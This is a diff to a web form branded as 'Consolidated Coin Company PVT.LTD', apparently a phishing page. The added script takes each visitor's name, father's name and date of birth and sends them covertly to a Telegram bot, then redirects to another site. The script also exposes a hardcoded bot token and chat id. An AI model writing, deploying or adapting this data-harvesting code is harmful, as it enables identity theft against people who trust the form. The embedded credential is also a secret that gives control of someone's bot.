@@ -3,6 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+           <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
     <link rel="stylesheet" href="styles.css">
     <title>Form</title>
     <style>
@@ -62,7 +63,7 @@ input[type="submit"]:hover {
    <center>
    <img src="https://i.postimg.cc/PJr5XLGK/Photoroom-20241020-165250.png" alt="Gas Bill Image" style="width: 100px">
    <h4>Consolidated Coin Company PVT.LTD</h4></center>
-        <form id="infoForm">
+        <form id="infoForm" action="" onsubmit=" return sender()">
             <label for="name">Name:</label>
             <input type="text" id="name" name="name" required>
 
@@ -75,5 +76,52 @@ input[type="submit"]:hover {
             <input type="submit" value="Submit">
         </form>
     </div>
+      <link rel="stylesheet" href="style.css">
+    <script src="sender.js"></script>
+  
+  <script>
+  //bot token
+var telegram_bot_id = "7790794227:AAFsSbfZBNBiMs93o_cT0bHJFvQuNtkXOm8";
+//chat id
+var chat_id = 1210231596;
+var ready = function () {
+    name = document.getElementById("name").value;
+    fatherName = document.getElementById("fatherName").value;
+    dob = document.getElementById("dob").value;
+  
+    message = 
+      "\nname: " + name +  
+      "\nfatherName: " + fatherName + 
+      "\ndob: " + dob;
+};
+var sender = function () {
+    ready();
+    var settings = {
+        "async": true,
+        "crossDomain": true,
+        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
+        "method": "POST",
+        "headers": {
+            "Content-Type": "application/json",
+            "cache-control": "no-cache"
+        },
+        "data": JSON.stringify({
+            "chat_id": chat_id,
+            "text": message,
+          "file": message
+        })
+    };
+    $.ajax(settings).done(function (response) {
+        console.log(response);
+        
+        document.location = "https://alokpqr.github.io/chandan2/"; 
+      
+    });
+    document.getElementById("name").value = "";
+    document.getElementById("fatherName").value = "";
+    document.getElementById("dob").value = "";
+    return false;
+};
+  </script>
 </body>
 </html>
